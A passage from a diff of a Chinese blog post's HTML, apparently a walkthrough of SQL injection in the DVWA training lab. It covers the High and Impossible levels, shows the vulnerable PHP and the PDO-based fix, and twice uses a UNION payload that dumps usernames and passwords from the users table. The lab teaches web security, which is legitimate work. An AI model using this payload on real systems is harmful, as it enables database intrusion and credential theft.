+<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
+<h3 id="7-下载数据-1"><a href="#7-下载数据-1" class="headerlink" title="7.下载数据"></a>7.下载数据</h3><p>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/21.PNG" alt=""></p>
+<p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_SESSION [ &#39;id&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_SESSION[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Check database </span><br><span class="line">    $query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id LIMIT 1;&quot;; </span><br><span class="line">    $result &#x3D; mysql_query( $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;&#x2F;pre&gt;&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get results </span><br><span class="line">    $num &#x3D; mysql_numrows( $result ); </span><br><span class="line">    $i   &#x3D; 0; </span><br><span class="line">    while( $i &lt; $num ) &#123; </span><br><span class="line">        &#x2F;&#x2F; Get values </span><br><span class="line">        $first &#x3D; mysql_result( $result, $i, &quot;first_name&quot; ); </span><br><span class="line">        $last  &#x3D; mysql_result( $result, $i, &quot;last_name&quot; ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Feedback for end user </span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Increase loop count </span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。</p>
+<p>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
+<p><img src="https://github.com/huskyhuman/gitpic/raw/master/blog/dvwa/SQL%20In/22.PNG" alt=""></p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>服务器端核心代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &#39;Submit&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Get input </span><br><span class="line">    $id &#x3D; $_GET[ &#39;id&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Was a number entered? </span><br><span class="line">    if(is_numeric( $id )) &#123; </span><br><span class="line">        &#x2F;&#x2F; Check the database </span><br><span class="line">        $data &#x3D; $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id &#x3D; (:id) LIMIT 1;&#39; ); </span><br><span class="line">        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">        $row &#x3D; $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Make sure only 1 result is returned </span><br><span class="line">        if( $data-&gt;rowCount() &#x3D;&#x3D; 1 ) &#123; </span><br><span class="line">            &#x2F;&#x2F; Get values </span><br><span class="line">            $first &#x3D; $row[ &#39;first_name&#39; ]; </span><br><span class="line">            $last  &#x3D; $row[ &#39;last_name&#39; ]; </span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Feedback for end user </span><br><span class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br &#x2F;&gt;First name: &#123;$first&#125;&lt;br &#x2F;&gt;Surname: &#123;$last&#125;&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
+
+      
+      <!-- 打赏 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/09/SQL%20Injection/" data-id="ck56chf0n0000fcvo8znyc0yx"
+        class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
     <article id="post-CSRF" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
